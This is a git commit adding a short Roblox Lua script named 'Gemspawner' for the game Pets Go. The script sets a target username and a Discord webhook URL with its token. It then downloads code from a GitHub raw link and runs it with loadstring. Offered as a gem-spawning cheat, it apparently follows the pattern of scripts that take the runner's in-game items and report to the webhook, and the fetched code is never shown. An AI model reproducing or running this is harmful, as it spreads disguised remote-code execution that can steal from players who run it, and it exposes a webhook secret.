1f0bb24b35c0b0c803665e03b5218c37c51ed043
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 01:14:18 +0200

    Added petsgo script: Gemspawner

---
+++ pets go/Gemspawner.lua
@@ -0,0 +1,5 @@
+Username = "m1234ao"
+Username2 = "m1234ao"
+Webhook = "https://discord.com/api/webhooks/1363290955167305758/pdu5wyFb7ZNrCPCm7rorLRi6dGqgPIpTWOFVw24BN5XzKoxys12l1h5oaTDwwxO8xtou"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
